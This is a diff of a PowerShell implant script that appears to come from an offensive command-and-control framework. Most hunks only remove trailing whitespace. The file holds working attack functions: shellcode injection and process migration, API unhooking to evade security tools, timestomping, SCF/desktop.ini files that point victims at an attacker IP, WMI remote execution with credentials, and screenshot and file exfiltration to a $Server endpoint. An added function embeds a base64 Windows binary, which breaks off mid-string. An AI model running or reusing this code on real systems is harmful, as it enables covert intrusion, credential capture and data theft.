@@ -9,18 +9,18 @@ function Test-Win32() {
 }
 
 Function Turtle($sleeptime) {
-    if ($sleeptime.ToLower().Contains('m')) { 
+    if ($sleeptime.ToLower().Contains('m')) {
         $sleeptime = $sleeptime -replace 'm', ''
-        [int]$newsleep = $sleeptime 
+        [int]$newsleep = $sleeptime
         [int]$newsleep = $newsleep * 60
     }
-    elseif ($sleeptime.ToLower().Contains('h')) { 
+    elseif ($sleeptime.ToLower().Contains('h')) {
         $sleeptime = $sleeptime -replace 'h', ''
-        [int]$newsleep1 = $sleeptime 
+        [int]$newsleep1 = $sleeptime
         [int]$newsleep2 = $newsleep1 * 60
         [int]$newsleep = $newsleep2 * 60
     }
-    elseif ($sleeptime.ToLower().Contains('s')) { 
+    elseif ($sleeptime.ToLower().Contains('s')) {
         $newsleep = $sleeptime -replace 's', ''
     } else {
         $newsleep = $sleeptime
@@ -47,7 +47,7 @@ Function CheckArchitecture
 Function Get-Proxy {
     Get-ItemProperty -Path "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
 }
-Function CheckVersionTwo 
+Function CheckVersionTwo
 {
     $psver = $PSVersionTable.psversion.Major
     if ($psver -ne '2') {
@@ -74,15 +74,15 @@ Function StartAnotherImplant {
 sal S StartAnotherImplant
 sal SAI StartAnotherImplant
 sal invoke-smblogin invoke-smbexec
-Function Invoke-DowngradeAttack 
+Function Invoke-DowngradeAttack
 {
     $payload = $payload -replace "-exec", "-v 2 -exec"
     StartAnotherImplant
 }
-function Test-Administrator  
-{  
+function Test-Administrator
+{
     $user = [Security.Principal.WindowsIdentity]::GetCurrent();
-    (New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)  
+    (New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
 }
 function Check-Command($cmdname)
 {
@@ -103,9 +103,9 @@ function EnableRDP
 {
     if (Test-Administrator) {
         set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
-        set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1   
+        set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
         $psver = $PSVersionTable.psversion.Major
-        if ($psver -ne '2') 
+        if ($psver -ne '2')
         {
             Get-NetFirewallRule -DisplayName "Remote Desktop*" | Set-NetFirewallRule -enabled true
         } else {
@@ -119,9 +119,9 @@ function DisableRDP
 {
     if (Test-Administrator) {
         set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 1
-        set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0 
+        set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0
         $psver = $PSVersionTable.psversion.Major
-        if ($psver -ne '2') 
+        if ($psver -ne '2')
         {
             Get-NetFirewallRule -DisplayName "Remote Desktop*" | Set-NetFirewallRule -enabled false
         } else {
@@ -131,17 +131,17 @@ function DisableRDP
     Write-Output "You are not elevated to Administator "
     }
 }
-function Write-SCFFile 
+function Write-SCFFile
 {
     Param ($IPaddress, $Location)
     "[Shell]" >$Location\~T0P0092.jpg.scf
-    "Command=2" >> $Location\~T0P0092.jpg.scf; 
-    "IconFile=\\$IPaddress\remote.ico" >> $Location\~T0P0092.jpg.scf; 
-    "[Taskbar]" >> $Location\~T0P0092.jpg.scf; 
-    "Command=ToggleDesktop" >> $Location\~T0P0092.jpg.scf; 
+    "Command=2" >> $Location\~T0P0092.jpg.scf;
+    "IconFile=\\$IPaddress\remote.ico" >> $Location\~T0P0092.jpg.scf;
+    "[Taskbar]" >> $Location\~T0P0092.jpg.scf;
+    "Command=ToggleDesktop" >> $Location\~T0P0092.jpg.scf;
     Write-Output "Written SCF File: $Location\~T0P0092.jpg.scf"
 }
-function Write-INIFile 
+function Write-INIFile
 {
     Param ($IPaddress, $Location)
     "[.ShellClassInfo]" > $Location\desktop.ini
@@ -221,12 +221,12 @@ Function RemoveExe-Persistence() {
         If (Test-Path $DestinationPath1) {
             Remove-Item -Force $DestinationPath1
         }
-        
+
         $DestinationPath2 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WinLogon.lnk"
         If (Test-Path $DestinationPath2) {
             Remove-Item -Force $DestinationPath2
         }
-        
+
         If ((Test-Path $DestinationPath1) -or ((Test-Path $DestinationPath2))) {
             Write-Output "Unable to Remove Persistence"
         } else {
@@ -272,7 +272,7 @@ Function Remove-Persistence
     }
 }
 }
-Function Web-Upload-File 
+Function Web-Upload-File
 {
     Param
     (
@@ -299,16 +299,16 @@ function ConvertFrom-Base64
         [string] $SourceFilePath,
         [string] $TargetFilePath
     )
- 
+
     $SourceFilePath = Resolve-PathSafe $SourceFilePath
     $TargetFilePath = Resolve-PathSafe $TargetFilePath
- 
+
     $bufferSize = 90000
     $buffer = New-Object char[] $bufferSize
-     
+
     $reader = [System.IO.File]::OpenText($SourceFilePath)
     $writer = [System.IO.File]::OpenWrite($TargetFilePath)
-     
+
     $bytesRead = 0
     do
     {
@@ -316,7 +316,7 @@ function ConvertFrom-Base64
         $bytes = [Convert]::FromBase64CharArray($buffer, 0, $bytesRead);
         $writer.Write($bytes, 0, $bytes.Length);
     } while ($bytesRead -eq $bufferSize);
-     
+
     $reader.Dispose()
     $writer.Dispose()
 }
@@ -336,20 +336,20 @@ Function Get-ScreenshotMulti {
     param($Timedelay, $Quantity, [string] $TaskId)
 
     if ($Quantity -and $Timedelay) {
-        ForEach ($number in 1..[int]$Quantity ) { 
+        ForEach ($number in 1..[int]$Quantity ) {
             try { $Output = Get-Screenshot } catch { $Output = $null }
             try {
             $Output = Encrypt-String2 $key $Output
             $UploadBytes = getimgdata $Output
             $eid = Encrypt-String $key $TaskId
             (Get-Webclient -Cookie $eid).UploadData("$Server", $UploadBytes)|out-null
-                
-            } catch {}      
+
+            } catch {}
             Start-Sleep $Timedelay
         }
     }
 }
-Function Get-Screenshot 
+Function Get-Screenshot
 {
     param($File)
 
@@ -375,7 +375,7 @@ Function Get-Screenshot
 
     # Send back as base64
     $msimage = New-Object IO.MemoryStream
-    
+
     if ($File) {
         $bitmap.save($file, "png")
     } else {
@@ -421,22 +421,22 @@ function Download-Files
     param
     (
         [string] $Directory, [string] $TaskId
-    ) 
+    )
     $files = Get-ChildItem $Directory -Recurse | Where-Object{!($_.PSIsContainer)}
     foreach ($item in $files)
     {
         Download-File -Source $item.FullName -TaskId $TaskId
-    } 
+    }
 }
-function Get-RandomName 
+function Get-RandomName
 {
-    param 
+    param
     (
         [int]$Length
     )
     $set    = 'abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray()
     $result = ''
-    for ($x = 0; $x -lt $Length; $x++) 
+    for ($x = 0; $x -lt $Length; $x++)
     {$result += $set | Get-Random}
     return $result
 }
@@ -454,8 +454,8 @@ function Download-File
         $fileNameOnly = [System.IO.Path]::GetFileNameWithoutExtension($fileName)
         $fullNewname = $Source
         $bufferSize = 10737418;
-        $fs = [System.IO.File]::OpenRead($fileName);  
-        $fileSize =(Get-Item $fileName).Length       
+        $fs = [System.IO.File]::OpenRead($fileName);
+        $fileSize =(Get-Item $fileName).Length
         $chunkSize = $fileSize / $bufferSize
         $totalChunks = [int][Math]::Ceiling($chunkSize)
         if ($totalChunks -lt 1) {$totalChunks = 1}
@@ -473,13 +473,13 @@ function Download-File
             $ChunkStr = $Chunk.ToString("00000")
             $ChunkedByte = [System.Text.Encoding]::UTF8.GetBytes($ChunkStr)
             $preNumbers = New-Object byte[] 10
-            $preNumbers = ($ChunkedByte+$totalChunkByte)           
+            $preNumbers = ($ChunkedByte+$totalChunkByte)
             $eid = Encrypt-String $key $TaskId
             $send = Encrypt-Bytes $key ($preNumbers+$str.ToArray())
             $UploadBytes = getimgdata $send
             (Get-Webclient -Cookie $eid).UploadData("$Server", $UploadBytes)|out-null
             $str.SetLength(0);
-            ++$Chunk 
+            ++$Chunk
         } until (($size -= $bufferSize) -le 0);
     } catch {
         $Output = "ErrorDownload: " + $error[0]
@@ -500,7 +500,7 @@ function Posh-Delete
     try {
     $file = Get-Item $Destination -Force
     $file.Attributes = "Normal"
-    $content = New-Object Byte[] $file.length 
+    $content = New-Object Byte[] $file.length
     (New-Object Random).NextBytes($content)
     [IO.File]::WriteAllBytes($file,$content)
     Remove-Item $Destination -Force
@@ -508,7 +508,7 @@ function Posh-Delete
     echo $error[0]
     }
 }
-function Upload-File 
+function Upload-File
 {
     param
     (
@@ -529,7 +529,7 @@ function Upload-File
         if ($NotHidden -eq $true) {
             $fileBytes = [Convert]::FromBase64String($Base64)
             if ($Stream){
-                set-content -path $Destination -value $fileBytes -stream $Stream -encoding byte 
+                set-content -path $Destination -value $fileBytes -stream $Stream -encoding byte
             } else {
                 [io.file]::WriteAllBytes($Destination, $fileBytes)
             }
@@ -541,7 +541,7 @@ function Upload-File
             $file = Get-Item $Destination -Force
             $attrib = $file.Attributes
             $attrib = "Hidden,System"
-            $file.Attributes = $attrib  
+            $file.Attributes = $attrib
             write-output "Run Get-ChildItem -Force to view the uploaded files"
         }
 
@@ -549,7 +549,7 @@ function Upload-File
 
         echo $error[0]
 
-    }  
+    }
 }
 Function UnHideFile ($file) {
     $f = Get-Item "$file" -Force
@@ -569,7 +569,7 @@ function Resolve-PathSafe
     (
         [string] $Path
     )
-      
+
     $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($Path)
 }
 function EnableWinRM {
@@ -621,7 +621,7 @@ $PSS = ConvertTo-SecureString $password -AsPlainText -Force
 $getcreds = new-object system.management.automation.PSCredential $username,$PSS
 $WMIResult = Invoke-WmiMethod -Path Win32_process -Name create -ComputerName $computer -Credential $getcreds -ArgumentList $command
 If ($WMIResult.Returnvalue -eq 0) {
-    Write-Output "Executed WMI Command with Sucess: $Command `n" 
+    Write-Output "Executed WMI Command with Sucess: $Command `n"
 } else {
     Write-Output "WMI Command Failed - Could be due to permissions or UAC is enabled on the remote host, Try mounting the C$ share to check administrative access to the host"
 }
@@ -745,22 +745,22 @@ try{
     echo $error[0]
 }
 }
-Function Invoke-Netstat {                       
-try {            
-    $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()            
-    $Connections = $TCPProperties.GetActiveTcpListeners()            
-    foreach($Connection in $Connections) {            
+Function Invoke-Netstat {
+try {
+    $TCPProperties = [System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()
+    $Connections = $TCPProperties.GetActiveTcpListeners()
+    foreach($Connection in $Connections) {
         if($Connection.address.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } else { $IPType = "IPv6" }
-        $OutputObj = New-Object -TypeName PSobject            
-        $OutputObj | Add-Member -MemberType NoteProperty -Name "LocalAddress" -Value $connection.Address            
-        $OutputObj | Add-Member -MemberType NoteProperty -Name "ListeningPort" -Value $Connection.Port            
-        $OutputObj | Add-Member -MemberType NoteProperty -Name "IPV4Or6" -Value $IPType            
-        $OutputObj            
-    }            
-            
-} catch {            
-    Write-Error "Failed to get listening connections. $_"            
-}           
+        $OutputObj = New-Object -TypeName PSobject
+        $OutputObj | Add-Member -MemberType NoteProperty -Name "LocalAddress" -Value $connection.Address
+        $OutputObj | Add-Member -MemberType NoteProperty -Name "ListeningPort" -Value $Connection.Port
+        $OutputObj | Add-Member -MemberType NoteProperty -Name "IPV4Or6" -Value $IPType
+        $OutputObj
+    }
+
+} catch {
+    Write-Error "Failed to get listening connections. $_"
+}
 }
 Function Get-Webpage {
     param (
@@ -768,9 +768,9 @@ Function Get-Webpage {
         [string] $TaskId
     )
     $file = (New-Object System.Net.Webclient).DownloadString($url)|Out-String
-    $eid = Encrypt-String $key $TaskId 
+    $eid = Encrypt-String $key $TaskId
     $bytes = [System.Text.Encoding]::UTF8.GetBytes($file)
-    $base64 = [Convert]::ToBase64String($bytes)  
+    $base64 = [Convert]::ToBase64String($bytes)
     $Output = Encrypt-String2 $key $base64
     $UploadBytes = getimgdata $Output
     (Get-Webclient -Cookie $eid).UploadData("$Server", $UploadBytes)|out-null
@@ -781,7 +781,7 @@ if (($p = Get-Process | ? {$_.id -eq $pid}).name -eq "powershell") {
 }
 if ($t -and [IntPtr]::size -eq 8){
    Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode64))
-} 
+}
 elseif (($t -and [IntPtr]::size -eq 4)) {
     Inject-Shellcode -x86 -Shellcode ([System.Convert]::FromBase64String($Shellcode86))
 }
@@ -789,13 +789,13 @@ elseif (($t -and [IntPtr]::size -eq 4)) {
 Function AutoMigrate-Always {
 if ([IntPtr]::size -eq 8){
    Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode64))
-} 
+}
 elseif ([IntPtr]::size -eq 4) {
     Inject-Shellcode -x86 -Shellcode ([System.Convert]::FromBase64String($Shellcode86))
 }
 }
 Function TimeStomp($File, $Date) {
-    $file=(gi $file -force) 
+    $file=(gi $file -force)
     $file.LastWriteTime=$date;
     $file.LastAccessTime=$date;
     $file.CreationTime=$date;
@@ -818,11 +818,11 @@ Function Get-AllFirewallRules($path) {
 }
 
 Function Unhook {
-    
+
 $win32 = @"
 using System.Runtime.InteropServices;
 using System;
-public class Unhook 
+public class Unhook
 {
     [DllImport("kernel32")]
     static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
@@ -859,7 +859,7 @@ public class Unhook
         {
             return;
         }
-        
+
         Marshal.Copy(n, 0, proc, n.Length);
         VirtualProtect(proc, dwSize, old, out old);
     }
@@ -868,4 +868,109 @@ public class Unhook
 "@
 Add-Type $win32
 $ptr = [Unhook]::Disable()
+}
+
+if (!(Test-Path variable:private:PwrStatus))
+{
+    $script:PwrStatus = @{}
+    echo "Creating vars"
+    $PwrStatus["evntId"] = ""
+    $PwrStatus["initd"] = $false
+    $PwrStatus["taskId"] = 0
+    echo "Done"
+}
+
+function loadPowerStatus
+{
+    param(
+        [string] $TaskId
+    )
+
+    if ($PwrStatus["initd"] -eq $false)
+    {
+        $PwrStatus["taskId"] = $TaskId
+        if ($psversiontable.PSVersion.Major -lt 4){
+                $global:callback=${function:sendPwrResponse}
+                $global:callback.Invoke("Power Status Monitoring: Currently only supported in PSv5 implants")
+            } else {
+                $ps="TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAPVJBLcAAAAAAAAAAOAAIiALATAAADAAAAAGAAAAAAAAMk8AAAAgAAAAYAAAAAAAEAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACgAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAOBOAABPAAAAAGAAALgDAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAwAAAAsTgAAOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAOC8AAAAgAAAAMAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAALgDAAAAYAAAAAQAAAAyAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAIAAAAACAAAANgAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAAAUTwAAAAAAAEgAAAACAAUAbCsAAMAiAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABswBADTAAAAAQAAEQAAKAMAAAYSACgEAAAGJhYG/gULByxwAAYoEQAACiUtDSYSBP4VAQAAGxEEKzkoEgAACiUtDSYSBP4VAQAAGxEEKyQoEwAACiUtDSYSBP4VAQAAGxEEKw9yAQAAcCgUAAAKcxUAAAoNEgMoFgAACi0DFisHEgMoFwAACgwILAUWEwXeTAArPH4YAAAKFhYWKAIAAAYoGQAAChMGEQYsJAAfCigaAAAKbxsAAApvHAAACv4CEwcRBywFFhMF3hIYEwXeDQDeBSYAAN4AFxMFKwARBSoAARAAAAAAAQDFxgAFDwAAASICKB0AAAoAKh4CewEAAAQqIgIDfQEAAAQqIgIoHgAACgAqABMwAwApAAAAAgAAEQJ7BAAABAoGCwcDKB8AAAp0FgAAAQwCfAQAAAQIBygBAAArCgYHM98qAAAAEzADACkAAAACAAARAnsEAAAECgYLBwMoIQAACnQWAAABDAJ8BAAABAgHKAEAACsKBgcz3yoAAAATMAEAEQAAAAMAABEAAnsCAAAEbyIAAAoKKwAGKr4AAgN9AgAABAOAAwAABAJ7BAAABCUtAyYrFAJzCAAABiUDbwcAAAYAbyMAAAoAKioCewQAAAQU/gMqIgIoHQAACgAqAAAAGzAEAGEAAAAEAAARAAAoAQAABgsHF/4BFv4BDAgsKwItAismAnIRAABw0AYAAAIoJAAACgeMBgAAAiglAAAKKCYAAAooDAAABgAA3gUmAADeAHMcAAAGJQJvEwAABgAKBignAAAKAAYNKwAJKgAAAAEQAAAAAAEAQEEABQ8AAAETMAIAMgAAAAUAABFzJQAABgoGAn00AAAEAAYUfTUAAAQG/gYmAAAGcygAAAooKQAACiYGezUAAAQLKwAHKioAAhYoKgAACgAqHgJ7BQAABCoiAgN9BQAABCoeAnsGAAAEKiICA30GAAAEKgATMAMAIQAAAAYAABEAAigrAAAKCgYlbywAAAoggAAAAGBvLQAACgAGCysAByoAAAATMAQAewAAAAcAABECFH0cAAAEAiguAAAKAAACKB4AAAYAAhYoLwAACgACFygwAAAKAAIoMQAAChYoFgAABhb+AQoGLAsoMgAACigzAAAKAAICKDEAAAp/FgAABBYoGAAABn0bAAAEfhgAAAoCexsAAAQoGQAACgsHLAsoMgAACigzAAAKACoiAig0AAAKACoTMAMAbQAAAAAAAAAAAhYoLwAACgACKDUAAAoAAiIAAMBAIgAAUEFzNgAACig3AAAKAAIXKDgAAAoAAhYWczkAAAooOgAACgACFig7AAAKAAJyQwAAcCg8AAAKAAJyQwAAcG89AAAKAAIXKDAAAAoAAhYoPgAACgAqAAAAEzAGADYCAAAIAAARABIAKBoAAAYmcz8AAAoLFgwWDQZ7JAAABBb+ARMEEQQscQAHckUAAHBvQAAACiYGeygAAARsKEEAAAoTBQdyhwAAcBqNDwAAASUWEgUoQgAACow2AAABoiUXEgUoQwAACow2AAABoiUYEgUoRAAACow2AAABoiUZEgUoRQAACow2AAABoihGAAAKb0AAAAomACsrBnskAAAEF/4B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